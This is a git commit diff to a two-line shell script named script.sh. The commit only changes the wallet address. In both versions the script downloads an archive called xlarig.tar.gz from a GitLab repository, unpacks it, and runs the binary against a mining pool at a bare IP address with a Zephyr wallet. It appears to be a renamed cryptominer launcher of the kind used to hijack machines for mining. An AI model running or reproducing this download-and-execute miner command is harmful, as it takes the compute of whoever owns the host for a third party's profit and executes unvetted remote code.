4bc66b09b5432c433a279b315b4a27c83319a698
inkabound <158990409+inkabound@users.noreply.github.com>
2024-04-20 22:41:42 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 
-wget https://gitlab.com/bromase889/cobagas/-/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz && chmod 700 xlarig && ./xlarig -o 157.245.205.181:80 -u ZEPHsARBxzqKD6jMfghnLoBhzBDr8SfMcD7fgnTd5FNB7CvfkH5ahziVHPXsLHkcRCA4SAAkqMzff3uvFGRju5SvZ3aAvHELvWT -p dasdes
+wget https://gitlab.com/bromase889/cobagas/-/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz && chmod 700 xlarig && ./xlarig -o 157.245.205.181:80 -u ZEPHYR2BcgCURr7KMEwog6HXk83Hbmf5eYv3mNTCeLgBGLkneZeS2pMiJ5D7WpEyycj22yyWzCUfUKBHQpXCXAYZDZ3sdvYLNzc33 -p dasdes
